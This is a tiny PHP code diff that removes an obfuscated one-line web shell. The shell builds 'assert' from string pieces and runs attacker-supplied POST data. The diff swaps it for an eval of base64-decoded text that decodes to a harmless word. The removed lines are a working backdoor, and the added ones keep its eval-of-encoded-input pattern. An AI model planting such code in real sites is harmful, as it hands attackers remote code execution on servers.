@@ -1,4 +1,3 @@
-<?php
-$a = substr('1a',1).'s'.'s'.'e'.'r'.'t';
-$a($_POST['x']);
-$b = __FILE__;
+<?php 
+$a = base64_decode('VGhyZWF0Ym9vaw==');
+eval(base64_decode('VGhyZWF0Ym9vaw=='));
